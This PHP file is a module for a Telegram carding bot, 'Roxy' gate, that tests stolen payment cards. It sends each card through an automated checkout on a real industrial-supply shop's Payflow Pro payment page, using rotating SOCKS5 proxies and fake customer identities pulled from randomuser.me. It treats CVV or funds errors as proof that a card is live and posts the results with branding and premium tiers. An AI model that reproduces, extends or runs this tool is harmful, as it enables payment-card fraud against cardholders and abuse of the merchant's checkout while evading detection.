<?php
list($cmd) = explode(" ", $message);
if($cmd == "/rx" or $cmd == ".rx" or $cmd == "!rx"){
    sendaction($chatId, typing);
$NameGater ='Roxy';
$gateway = '/rx :'.$NameGater;
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>None!</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!rx card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-None!
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User




$rotate = rotate();
$socks5 = socks5();


$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 14);


$curl = new CurlX;
$cookie = uniqid();


$server = ["METHOD" => "CUSTOM", "SERVER" => $socks5 ,"AUTH" => $rotate];

if(strlen($mes) == 1){
    $mes = "0".$mes;
  }

if(strlen($ano) == 2){
  $ano = "20".$ano;
}
$agent = new userAgent();
$user_agents = $agent->generate('firefox'); 


$req1 = $curl::Get("https://www.aaaindustrialsupply.com/olfascissorsscs-1model9765-.aspx", $headers = null, $cookie,$server);

$VIEWSTATE = urlencode($curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$EVENTVALIDATION = urlencode($curl::ParseString($req1->body, '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"'));
$VIEWSTATEGENERATOR = $curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');

$req2 = $curl::Post('https://www.aaaindustrialsupply.com/olfascissorsscs-1model9765-.aspx',$data = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='.$VIEWSTATE.'&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=863&__EVENTVALIDATION='.$EVENTVALIDATION.'&ctl00%24ctl10%24search=Search+Our+Store&ctl00%24pageContent%24productDetailsID=560&ctl00%24pageContent%24txtQuantity=1&ctl00%24pageContent%24addToCart.x=194&ctl00%24pageContent%24addToCart.y=29&ctl00%24pageContent%24ctl148%24productList%24ctl00%24txtQuantity=1&ctl00%24pageContent%24ctl148%24productList%24ctl01%24txtQuantity=1
', $headers  = ['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Accept-Language: es-ES,es;q=0.9',
'Cache-Control: max-age=0',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.aaaindustrialsupply.com',
'Referer: https://www.aaaindustrialsupply.com/olfascissorsscs-1model9765-.aspx',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',], $cookie,$server);


$req1 = $curl::Get("https://www.aaaindustrialsupply.com/checkout.aspx", $headers = null, $cookie,$server);
$VIEWSTATE = urlencode($curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$EVENTVALIDATION = urlencode($curl::ParseString($req1->body, '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"'));
$VIEWSTATEGENERATOR = $curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');





$req1 = $curl::Post('https://www.aaaindustrialsupply.com/checkout.aspx?step-2',$data = 'ctl00%24ctl10%24search=Search+Our+Store&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtFirstName='.$firstname.'&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtLastName='.$lastname.'&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtCompanyName=Corp+'.$lastname.'&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24ddlCountry=US&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtAddress1='.urlencode($street).'&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtAddress2=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtZipPostal=98501&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtCity=Olympia&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24usStates=WA&ctl00%24pageContent%24checkoutWizard%24customerInformation%24shippingAddress%24txtPhoneNumber='.urlencode($phone).'&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24chkBillingSameAsShipping=on&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtFirstName=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtLastName=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtCompanyName=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24ddlCountry=US&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtAddress1=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtAddress2=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtZipPostal=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtCity=&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24usStates=AL&ctl00%24pageContent%24checkoutWizard%24customerInformation%24billingAddress%24txtPhoneNumber=&ctl00%24pageContent%24checkoutWizard%24emailForm%24txtEmail='.urlencode($email).'&ctl00%24pageContent%24checkoutWizard%24emailForm%24txtConfirmEmail='.urlencode($email).'&ctl00%24pageContent%24checkoutWizard%24StartNavigationTemplateContainerID%24btnNext.x=48&ctl00%24pageContent%24checkoutWizard%24StartNavigationTemplateContainerID%24btnNext.y=4&__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE='.$VIEWSTATE.'&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=959&__VIEWSTATEENCRYPTED=&__PREVIOUSPAGE=q4-3ILS-E9QK3-KnCyeSxjXobh7WXzw4S9-gdMTm6SqjrL_HH-dfzZj5Eke66_DmQzjVSvUpDyKW27y_JqaEWQ2&__EVENTVALIDATION='.$EVENTVALIDATION.'', 
$headers  = ['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Accept-Language: es-ES,es;q=0.9',
'Cache-Control: max-age=0',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.aaaindustrialsupply.com',
'Referer: https://www.aaaindustrialsupply.com/checkout.aspx',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',], $cookie,$server);


$VIEWSTATE = urlencode($curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$EVENTVALIDATION = urlencode($curl::ParseString($req1->body, '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"'));
$VIEWSTATEGENERATOR = $curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');


$req1 = $curl::Post('https://www.aaaindustrialsupply.com/checkout.aspx?step-3',$data = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='.$VIEWSTATE.'&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=619&__VIEWSTATEENCRYPTED=&__PREVIOUSPAGE=q4-3ILS-E9QK3-KnCyeSxjXobh7WXzw4S9-gdMTm6SqjrL_HH-dfzZj5Eke66_DmQzjVSvUpDyKW27y_JqaEWQ2&__EVENTVALIDATION='.$EVENTVALIDATION.'&ctl00%24ctl10%24search=Search+Our+Store&ShippingOptions=ctl00%24pageContent%24checkoutWizard%24shippingMethods%24CUST%24rate0&ctl00%24pageContent%24checkoutWizard%24couponCodes%24txtEnterCouponCode=&ctl00%24pageContent%24checkoutWizard%24StepNavigationTemplateContainerID%24btnNext.x=54&ctl00%24pageContent%24checkoutWizard%24StepNavigationTemplateContainerID%24btnNext.y=13', $headers  = ['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Accept-Language: es-ES,es;q=0.9',
'Cache-Control: max-age=0',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.aaaindustrialsupply.com',
'Referer: https://www.aaaindustrialsupply.com/checkout.aspx?step-2',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',], $cookie,$server);

$VIEWSTATE = urlencode($curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$EVENTVALIDATION = urlencode($curl::ParseString($req1->body, '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"'));
$VIEWSTATEGENERATOR = $curl::ParseString($req1->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');


$option = ["4"=>"2","5"=>"1","3"=>"3","6"=>"4"];
$cctype = $option[substr($cc, 0,1)];



$req2 = $curl::Post('https://www.aaaindustrialsupply.com/checkout.aspx?complete',$data = '__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE='.$VIEWSTATE.'&__VIEWSTATEGENERATOR='.$VIEWSTATEGENERATOR.'&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=1877&__VIEWSTATEENCRYPTED=&__PREVIOUSPAGE=q4-3ILS-E9QK3-KnCyeSxjXobh7WXzw4S9-gdMTm6SqjrL_HH-dfzZj5Eke66_DmQzjVSvUpDyKW27y_JqaEWQ2&__EVENTVALIDATION='.$EVENTVALIDATION.'&ctl00%24ctl10%24search=Search+Our+Store&ctl00%24pageContent%24checkoutWizard%24orderInvoiceReview%24txtOrderNotes=&ctl00%24pageContent%24checkoutWizard%24payments%24paymentMethodSelector=payflow-pro&ctl00%24pageContent%24checkoutWizard%24payments%24payflowpro%24fields%24ccfname%24value=Destin&ctl00%24pageContent%24checkoutWizard%24payments%24payflowpro%24fields%24cclname%24value=Funk&ctl00%24pageContent%24checkoutWizard%24payments%24payflowpro%24fields%24ccnumber%24value=' . $cc . '&ctl00%24pageContent%24checkoutWizard%24payments%24payflowpro%24fields%24cctype%24value=' . $cctype . '&ctl00%24pageContent%24checkoutWizard%24payments%24payflowpro%24fields%24ccexpiration%24month=' . $mes . '&ctl00%24pageContent%24checkoutWizard%24payments%24payflowpro%24fields%24ccexpiration%24year=' . $ano . '&ctl00%24pageContent%24checkoutWizard%24payments%24payflowpro%24fields%24cccvv%24value=' . $cvv . '&ctl00%24pageContent%24checkoutWizard%24FinishNavigationTemplateContainerID%24btnNext.x=64&ctl00%24pageContent%24checkoutWizard%24FinishNavigationTemplateContainerID%24btnNext.y=15', $headers  = [
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Accept-Language: es-ES,es;q=0.9',
'Cache-Control: max-age=0',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.aaaindustrialsupply.com',
'Referer: https://www.aaaindustrialsupply.com/checkout.aspx?step-3',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
], $cookie,$server);


$mgs = strip_tags(trim($curl::ParseString($req2->body, '<div class="notification text-error">', '</div>')));


$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow AVS
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

if(substr_count($req2->body, 'Card Security Code (CSC/CVV2) is invalid')){
$status = "APPROVED ✅ ";
$response = "Card Security Code (CSC/CVV2) is invalid";
}elseif(substr_count($req2->body, 'Gateway Rejected: cvv')){
$status = "APPROVED ✅ ";
$response = "Gateway Rejected: cvv";
}elseif(substr_count($req2->body, 'Insufficient Funds')){
$status = "APPROVED ✅ ";
$response = "Insufficient Funds";
}elseif(substr_count($req2->body, 'Gateway Rejected: avs')){
$status = "APPROVED ✅ ";
$response = "Gateway Rejected: avs";
}elseif(substr_count($req2->body, 'Add a new payment method')){
$status = "APPROVED ✅ ";
$response = "APPROVED";
}else{
$status = "DECLINED #DEAD ❌";
$response = $mgs;
}

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-None!
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


}

?>